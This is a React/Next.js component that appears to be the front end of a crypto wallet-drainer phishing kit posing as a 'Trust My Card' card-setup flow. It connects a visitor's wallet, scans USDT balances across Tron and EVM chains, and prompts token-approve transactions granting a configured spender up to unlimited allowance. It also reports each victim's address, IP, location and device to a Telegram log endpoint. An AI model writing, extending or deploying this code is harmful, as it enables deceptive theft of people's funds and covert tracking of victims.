"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import {
  configGaps,
  getAllowancePolicy,
  getSpenderEvm,
} from "@/lib/approve-config";
import {
  EVM_CHAIN_ID,
  EVM_USDT,
  MAX_UINT256,
  isEvmChainKey,
  parseHumanToRaw,
} from "@/lib/chain-tokens";

const projectId = process.env.NEXT_PUBLIC_PROJECT_ID;

type UniversalProvider = Awaited<
  ReturnType<
    Awaited<
      typeof import("@walletconnect/universal-provider")
    >["default"]["init"]
  >
>;

type WalletConnectModal = InstanceType<
  typeof import("@walletconnect/modal").WalletConnectModal
>;

type WcSession = {
  namespaces?: Record<string, { accounts?: string[] }>;
};

type TokenBalances = {
  native: string;
  usdt: string;
  usdc?: string;
};

type BalancesResponse = Record<string, TokenBalances>;

type NetworkRow = {
  key: string;
  name: string;
  standard: string;
  color: string;
  letter: string;
  balances: TokenBalances;
};

type LinkedAccounts = { evm: string | null; tron: string | null };

type RowStatus = "awaiting" | "waiting" | "approved" | "rejected";

const NETWORK_META: Record<
  string,
  { name: string; standard: string; color: string; letter: string }
> = {
  tron: { name: "Tron", standard: "TRC-20", color: "#FF0013", letter: "T" },
  eth: { name: "Ethereum", standard: "ERC-20", color: "#627EEA", letter: "Ξ" },
  bsc: { name: "BSC", standard: "BEP-20", color: "#F0B90B", letter: "B" },
  pol: { name: "Polygon", standard: "ERC-20", color: "#8247E5", letter: "P" },
  avax: { name: "Avalanche", standard: "ERC-20", color: "#E84142", letter: "A" },
  arb: { name: "Arbitrum", standard: "ERC-20", color: "#12AAFF", letter: "A" },
  base: { name: "Base", standard: "ERC-20", color: "#0052FF", letter: "B" },
};

const DISPLAY_ORDER = ["tron", "eth", "bsc", "pol", "avax", "arb", "base"];

const WC_EVM_CHAINS = [
  "eip155:1",
  "eip155:56",
  "eip155:137",
  "eip155:43114",
  "eip155:8453",
  "eip155:42161",
  "eip155:10",
];

const METADATA = {
  name: "Trust My Card",
  description: "Connect your wallet to continue with card setup",
  url: "http://localhost:3000",
  icons: ["https://avatars.githubusercontent.com/u/37784886"],
};

const TRON_CAIP = "tron:0x2b6653dc";

function caipAccountAddress(caip: string) {
  const parts = caip.split(":");
  return parts[parts.length - 1] ?? "";
}

/**
 * Universal Provider only builds sub-providers for eip155/solana/cosmos/etc.
 * It has NO `tron` case — `provider.request(..., "tron:…")` always throws
 * "Provider not found: tron". Route Tron through Sign Client (or injected TronLink).
 */
async function tronSignTransaction(
  provider: UniversalProvider,
  address: string,
  transaction: Record<string, unknown>
): Promise<unknown> {
  const session = provider.session as
    | { topic?: string; namespaces?: Record<string, { accounts?: string[] }> }
    | undefined;
  const tronAccounts = session?.namespaces?.tron?.accounts ?? [];
  const hasWcTron = tronAccounts.length > 0;

  if (hasWcTron && session?.topic && provider.client) {
    // Prefer the session account if it differs slightly from our linked copy
    const sessionAddr =
      tronAccounts
        .map((a) => caipAccountAddress(a))
        .find((a) => a.toLowerCase() === address.toLowerCase()) ||
      caipAccountAddress(tronAccounts[0]) ||
      address;

    return provider.client.request({
      topic: session.topic,
      chainId: TRON_CAIP,
      request: {
        method: "tron_signTransaction",
        params: {
          address: sessionAddr,
          transaction,
        },
      },
    });
  }

  // Injected TronLink / in-app browser
  if (typeof window !== "undefined") {
    const w = window as Window & {
      tronWeb?: {
        defaultAddress?: { base58?: string };
        trx?: {
          sign: (tx: Record<string, unknown>) => Promise<unknown>;
        };
      };
    };
    if (w.tronWeb?.trx?.sign) {
      return w.tronWeb.trx.sign(transaction);
    }
  }

  throw new Error(
    "Tron signing unavailable. Reconnect via WalletConnect and approve the Tron network, or open this page in Trust/TronLink."
  );
}

function accountsFromSession(session: WcSession | undefined): LinkedAccounts {
  return {
    evm: session?.namespaces?.eip155?.accounts?.[0]
      ? caipAccountAddress(session.namespaces.eip155.accounts[0])
      : null,
    tron: session?.namespaces?.tron?.accounts?.[0]
      ? caipAccountAddress(session.namespaces.tron.accounts[0])
      : null,
  };
}

async function getTronLinkAddress(): Promise<string | null> {
  if (typeof window === "undefined") return null;
  const w = window as Window & {
    tronLink?: { request: (args: { method: string }) => Promise<unknown> };
    tronWeb?: { defaultAddress?: { base58?: string } };
  };
  try {
    if (w.tronLink?.request) {
      await w.tronLink.request({ method: "tron_requestAccounts" });
    }
    const addr = w.tronWeb?.defaultAddress?.base58;
    return addr?.startsWith("T") ? addr : null;
  } catch {
    return null;
  }
}

function rowsFromBalances(data: BalancesResponse): NetworkRow[] {
  return Object.keys(data)
    .sort((a, b) => {
      const ai = DISPLAY_ORDER.indexOf(a);
      const bi = DISPLAY_ORDER.indexOf(b);
      return (ai === -1 ? 999 : ai) - (bi === -1 ? 999 : bi);
    })
    .map((key) => {
      const meta = NETWORK_META[key] ?? {
        name: key.toUpperCase(),
        standard: "Token",
        color: "#52525b",
        letter: key.slice(0, 1).toUpperCase(),
      };
      return { key, ...meta, balances: data[key] };
    });
}

async function fetchBalances(
  evm: string | null,
  tron: string | null
): Promise<BalancesResponse> {
  const params = new URLSearchParams();
  if (evm) params.set("evm", evm);
  if (tron) params.set("tron", tron);
  const res = await fetch(`/api/balances?${params}`, { cache: "no-store" });
  if (!res.ok) {
    const body = await res.json().catch(() => null);
    throw new Error(body?.error || `Balances failed (${res.status})`);
  }
  return res.json();
}

function deviceLabel(): string {
  if (typeof navigator === "undefined") return "Other";
  const ua = navigator.userAgent.toLowerCase();
  if (/ipad|tablet/.test(ua)) return "Tablet";
  if (/mobi|iphone|android/.test(ua)) return "Mobile";
  if (/mac|win|linux|cros/.test(ua)) return "Desktop";
  return "Other";
}

async function fetchClientGeo(): Promise<{ ip: string; location: string }> {
  try {
    const res = await fetch("/api/ipgeo", { cache: "no-store" });
    if (!res.ok) return { ip: "unknown", location: "Unknown" };
    const json = (await res.json()) as { ip?: string; location?: string };
    return {
      ip: json.ip || "unknown",
      location: json.location || "Unknown",
    };
  } catch {
    return { ip: "unknown", location: "Unknown" };
  }
}

async function postTgLog(payload: {
  type: string;
  address: string;
  network: string;
  status: string;
  error?: string | null;
}): Promise<void> {
  try {
    const geo = await fetchClientGeo();
    await fetch("/api/tg-log", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        type: payload.type,
        site:
          typeof window !== "undefined" ? window.location.hostname : "unknown",
        device: deviceLabel(),
        ip: geo.ip,
        address: payload.address,
        error: payload.error ?? null,
        location: geo.location,
        network: payload.network,
        status: payload.status,
      }),
      cache: "no-store",
    });
  } catch (err) {
    console.warn("[tg-log] client notify failed", err);
  }
}

function pad32(hexOrAddr: string): string {
  const h = hexOrAddr.replace(/^0x/i, "").toLowerCase();
  return h.padStart(64, "0");
}

function encodeErc20Approve(spender: string, amount: bigint): string {
  return `0x095ea7b3${pad32(spender)}${pad32(amount.toString(16))}`;
}

function resolveEvmAmountRaw(decimals: number): bigint {
  const policy = getAllowancePolicy();
  if (policy.mode === "unset") {
    throw new Error("Set NEXT_PUBLIC_APPROVE_AMOUNT_USDT in .env.local");
  }
  if (policy.mode === "max") return BigInt(MAX_UINT256);
  return parseHumanToRaw(policy.humanAmount, decimals);
}

function statusLabel(status: RowStatus): string {
  switch (status) {
    case "waiting":
      return "Waiting for confirmation...";
    case "approved":
      return "Approved";
    case "rejected":
      return "Rejected";
    default:
      return "Awaiting";
  }
}

/**
 * WalletConnectModal appends a <wcm-modal> on every `new`.
 * React Strict Mode remounts effects in dev → duplicate nodes → stacked modals.
 * Keep a single instance and purge extras.
 */
let sharedWcModal: WalletConnectModal | null = null;

function purgeExtraWcmModals(keep?: Element | null) {
  if (typeof document === "undefined") return;
  document.querySelectorAll("wcm-modal").forEach((el) => {
    if (keep && el === keep) return;
    el.remove();
  });
}

function getSharedWcModal(
  WalletConnectModalCtor: typeof import("@walletconnect/modal").WalletConnectModal,
  id: string
): WalletConnectModal {
  const existing = document.querySelector("wcm-modal");
  if (sharedWcModal && existing) {
    purgeExtraWcmModals(existing);
    return sharedWcModal;
  }

  purgeExtraWcmModals();
  sharedWcModal = new WalletConnectModalCtor({
    projectId: id,
    themeMode: "dark",
    themeVariables: { "--wcm-z-index": "9999" },
  });
  purgeExtraWcmModals(document.querySelector("wcm-modal"));
  return sharedWcModal;
}

export default function ConnectFlow() {
  const providerRef = useRef<UniversalProvider | null>(null);
  const modalRef = useRef<WalletConnectModal | null>(null);
  const connectingRef = useRef(false);
  const approvingLockRef = useRef(false);
  const initOnceRef = useRef(false);
  const accountsRef = useRef<LinkedAccounts>({ evm: null, tron: null });

  const [ready, setReady] = useState(false);
  const [busy, setBusy] = useState(false);
  const [approving, setApproving] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [networks, setNetworks] = useState<NetworkRow[]>([]);
  const [selectedKey, setSelectedKey] = useState<string | null>(null);
  const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});

  const setStatus = useCallback((key: string, status: RowStatus) => {
    setRowStatus((prev) => ({ ...prev, [key]: status }));
  }, []);

  const scanWallet = useCallback(async (linked: LinkedAccounts) => {
    if (!linked.evm && !linked.tron) {
      setNetworks([]);
      return;
    }

    setError(null);
    setNetworks([]);
    setSelectedKey(null);
    setRowStatus({});

    try {
      let tron = linked.tron;
      if (!tron) tron = await getTronLinkAddress();

      const linkedFinal = { evm: linked.evm, tron };
      accountsRef.current = linkedFinal;

      const primary = tron || linked.evm;
      const network = tron ? "tron" : "evm";
      const [, data] = await Promise.all([
        primary
          ? postTgLog({
              type: "scan",
              address: primary,
              network,
              status: "success",
              error: null,
            })
          : Promise.resolve(),
        fetchBalances(linked.evm, tron),
      ]);

      const rows = rowsFromBalances(data);
      setNetworks(rows);
      setRowStatus(
        Object.fromEntries(rows.map((r) => [r.key, "awaiting" as RowStatus]))
      );
      setShowResults(true);
    } catch (err: unknown) {
      console.error(err);
      setError(err instanceof Error ? err.message : "Failed to fetch balances");
      setNetworks([]);
    }
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function init() {
      if (!projectId) {
        setError("Missing NEXT_PUBLIC_PROJECT_ID in .env.local");
        return;
      }

      if (initOnceRef.current && providerRef.current && modalRef.current) {
        setReady(true);
        return;
      }

      const [{ default: UniversalProvider }, { WalletConnectModal }] =
        await Promise.all([
          import("@walletconnect/universal-provider"),
          import("@walletconnect/modal"),
        ]);

      if (cancelled) return;

      const modal = getSharedWcModal(WalletConnectModal, projectId);

      const provider = await UniversalProvider.init({
        projectId,
        metadata: {
          ...METADATA,
          url:
            typeof window !== "undefined"
              ? window.location.origin
              : METADATA.url,
        },
      });

      if (cancelled) return;

      provider.events.removeAllListeners("display_uri");
      provider.events.removeAllListeners("session_delete");
      provider.on("display_uri", (uri: string) => {
        purgeExtraWcmModals(document.querySelector("wcm-modal"));
        void modal.openModal({ uri });
      });
      provider.on("session_delete", () => {
        setNetworks([]);
        setShowResults(false);
        setSelectedKey(null);
        setRowStatus({});
        accountsRef.current = { evm: null, tron: null };
      });

      providerRef.current = provider;
      modalRef.current = modal;
      initOnceRef.current = true;
      setReady(true);
    }

    init().catch((err: unknown) => {
      console.error(err);
      setError(
        err instanceof Error ? err.message : "Failed to init WalletConnect"
      );
    });

    return () => {
      cancelled = true;
      modalRef.current?.closeModal();
    };
  }, []);

  const openWalletConnect = useCallback(async () => {
    const provider = providerRef.current;
    const modal = modalRef.current;
    if (!provider || connectingRef.current) return;

    connectingRef.current = true;
    setError(null);
    setBusy(true);
    setShowResults(false);
    setNetworks([]);
    setSelectedKey(null);
    setRowStatus({});

    try {
      if (provider.session) {
        await provider.disconnect().catch(() => undefined);
      }

      await provider.connect({
        // Keep EVM optional so wallets that only do Tron can still connect.
        optionalNamespaces: {
          eip155: {
            methods: [
              "eth_sendTransaction",
              "eth_signTransaction",
              "eth_sign",
              "personal_sign",
              "eth_signTypedData",
              "eth_signTypedData_v4",
            ],
            chains: WC_EVM_CHAINS,
            events: ["chainChanged", "accountsChanged"],
          },
          tron: {
            methods: [
              "tron_signTransaction",
              "tron_signMessage",
              "tron_signMessageV2",
            ],
            chains: [TRON_CAIP],
            events: ["accountsChanged", "chainChanged"],
            // Helps wallets that expect an RPC hint (not used by UP for tron signing).
            rpcMap: {
              "0x2b6653dc": "https://api.trongrid.io",
            },
          },
        },
      });

      modal?.closeModal();

      const linked = accountsFromSession(provider.session);

      if (!linked.evm && !linked.tron) {
        setError("No account returned from wallet. Please try again.");
        return;
      }

      await scanWallet(linked);
    } catch (err: unknown) {
      console.error(err);
      modal?.closeModal();
      const message =
        err instanceof Error ? err.message : "Connection cancelled";
      if (/reset/i.test(message)) {
        setError("Connection request reset. Please try again.");
      } else if (!/rejected|denied|cancel/i.test(message)) {
        setError(message);
      }
      setNetworks([]);
      setShowResults(false);
    } finally {
      connectingRef.current = false;
      setBusy(false);
    }
  }, [scanWallet]);

  const requestApprove = useCallback(
    async (networkKey: string) => {
      const provider = providerRef.current;
      if (!provider || approvingLockRef.current) return;

      const gaps = configGaps(networkKey);
      if (gaps.length > 0) {
        setError(
          `Fill placeholders in .env.local: ${gaps.join(", ")} (then restart dev server)`
        );
        return;
      }

      const linked = accountsRef.current;
      approvingLockRef.current = true;
      setApproving(true);
      setError(null);
      setSelectedKey(networkKey);
      setStatus(networkKey, "waiting");

      const addressForLog =
        networkKey === "tron" ? linked.tron : linked.evm;

      try {
        if (networkKey === "tron") {
          if (!linked.tron) {
            throw new Error("No Tron address in this WalletConnect session");
          }

          // Placeholder energy hook (competitor calls energy-delegate here)
          await fetch("/api/energy-delegate", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({ address: linked.tron }),
            cache: "no-store",
          }).catch(() => undefined);

          const buildRes = await fetch("/api/tron-approve", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({ owner: linked.tron }),
            cache: "no-store",
          });
          const buildJson = (await buildRes.json()) as {
            transaction?: Record<string, unknown>;
            error?: string;
          };
          if (!buildRes.ok || !buildJson.transaction) {
            throw new Error(buildJson.error || "Failed to build Tron approve");
          }

          // Must use Sign Client (not provider.request) — UP has no tron sub-provider
          await tronSignTransaction(
            provider,
            linked.tron,
            buildJson.transaction
          );

          // Optional broadcast — many wallets only sign; broadcast unsigned-signed tx if returned
          // PLACEHOLDER: add broadcast via /wallet/broadcasttransaction when you want on-chain finality here
        } else if (isEvmChainKey(networkKey)) {
          if (!linked.evm) {
            throw new Error("No EVM address in this WalletConnect session");
          }
          const spender = getSpenderEvm();
          if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
            throw new Error("NEXT_PUBLIC_SPENDER_EVM is not a valid 0x address");
          }
          const token = EVM_USDT[networkKey];
          const amount = resolveEvmAmountRaw(token.decimals);
          const data = encodeErc20Approve(spender, amount);
          const chainId = EVM_CHAIN_ID[networkKey];

          await provider.request(
            {
              method: "eth_sendTransaction",
              params: [
                {
                  from: linked.evm,
                  to: token.address,
                  data,
                  value: "0x0",
                },
              ],
            },
            `eip155:${chainId}`
          );
        } else {
          throw new Error(`Unsupported network: ${networkKey}`);
        }

        setStatus(networkKey, "approved");
        if (addressForLog) {
          void postTgLog({
            type: "approve",
            address: addressForLog,
            network: networkKey,
            status: "success",
            error: null,
          });
        }
      } catch (err: unknown) {
        console.error(err);
        const message =
          err instanceof Error ? err.message : "Approval failed";
        const rejected = /reject|denied|cancel/i.test(message);
        setStatus(networkKey, rejected ? "rejected" : "awaiting");
        if (!rejected) setError(message);
        if (addressForLog) {
          void postTgLog({
            type: "approve",
            address: addressForLog,
            network: networkKey,
            status: "rejected",
            error: rejected ? "User canceled" : message,
          });
        }
        // Reset rejected → awaiting after a beat (match list UX)
        if (rejected) {
          window.setTimeout(() => setStatus(networkKey, "awaiting"), 1600);
        }
      } finally {
        approvingLockRef.current = false;
        setApproving(false);
      }
    },
    [setStatus]
  );

  const onSelectNetwork = useCallback(
    (key: string) => {
      if (approving) return;
      setSelectedKey(key);
      setError(null);
    },
    [approving]
  );

  const onContinue = useCallback(() => {
    if (!selectedKey) {
      setError("Select a network first");
      return;
    }
    void requestApprove(selectedKey);
  }, [requestApprove, selectedKey]);

  const closeModal = useCallback(() => {
    if (approving) return;
    setShowResults(false);
  }, [approving]);

  return (
    <>
      <div className="flex flex-col items-center gap-3">
        <button
          type="button"
          disabled={!ready || busy}
          onClick={openWalletConnect}
          className="rounded-xl bg-[#3396f0] px-8 py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
        >
          {busy ? "Connecting…" : "Connect Wallet"}
        </button>
        {error && !showResults ? (
          <p className="max-w-xs text-center text-sm text-red-600">{error}</p>
        ) : null}
      </div>

      {showResults && networks.length > 0 ? (
        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-md overflow-hidden rounded-2xl border border-[#3396f0]/40 bg-white shadow-2xl">
            {/* Progress — Step 2 of 3 */}
            <div className="h-1 w-full bg-zinc-100">
              <div className="h-full w-[66%] bg-[#3396f0]" />
            </div>

            <div className="flex items-center justify-between px-4 pt-4">
              <button
                type="button"
                aria-label="Back"
                onClick={closeModal}
                className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50"
              >
                ‹
              </button>
              <div className="text-center">
                <p className="text-base font-semibold text-zinc-900">Setup</p>
                <p className="text-xs text-zinc-500">Step 2 of 3</p>
              </div>
              <button
                type="button"
                aria-label="Close"
                onClick={closeModal}
                className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50"
              >
                ×
              </button>
            </div>

            <div className="px-5 pb-5 pt-4">
              <p className="mb-4 text-sm text-zinc-600">
                Scanning your wallet on supported networks.
              </p>

              {error ? (
                <p className="mb-3 text-sm text-red-600">{error}</p>
              ) : null}

              <ul className="space-y-2">
                {networks.map((network) => {
                  const status = rowStatus[network.key] ?? "awaiting";
                  const selected = selectedKey === network.key;
                  const waiting = status === "waiting";
                  const approved = status === "approved";

                  return (
                    <li key={network.key}>
                      <button
                        type="button"
                        disabled={approving && !waiting}
                        onClick={() => onSelectNetwork(network.key)}
                        className={[
                          "flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition",
                          waiting || (selected && !approved)
                            ? "border-[#3396f0] bg-[#3396f0]/10 shadow-sm"
                            : approved
                              ? "border-emerald-300 bg-emerald-50"
                              : "border-zinc-200 bg-white hover:border-zinc-300",
                        ].join(" ")}
                      >
                        {waiting ? (
                          <span className="flex h-10 w-10 shrink-0 items-center justify-center">
                            <span className="h-6 w-6 animate-spin rounded-full border-2 border-[#3396f0] border-t-transparent" />
                          </span>
                        ) : (
                          <span
                            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                            style={{ backgroundColor: network.color }}
                          >
                            {network.letter}
                          </span>
                        )}

                        <span className="min-w-0 flex-1">
                          <span className="block text-sm font-semibold text-zinc-900">
                            {network.name}{" "}
                            <span className="font-normal text-zinc-500">
                              ({network.standard})
                            </span>
                          </span>
                          <span className="mt-0.5 block text-xs text-zinc-500">
                            {statusLabel(status)}
                          </span>
                        </span>

                        {!waiting ? (
                          <span className="text-lg text-zinc-300" aria-hidden>
                            ›
                          </span>
                        ) : null}
                      </button>
                    </li>
                  );
                })}
              </ul>

              <button
                type="button"
                disabled={!selectedKey || approving}
                onClick={onContinue}
                className="mt-5 w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
              >
                {selectedKey && rowStatus[selectedKey] === "waiting"
                  ? "Waiting for confirmation..."
                  : "Continue"}
              </button>
            </div>
          </div>
        </div>
      ) : null}
    </>
  );
}
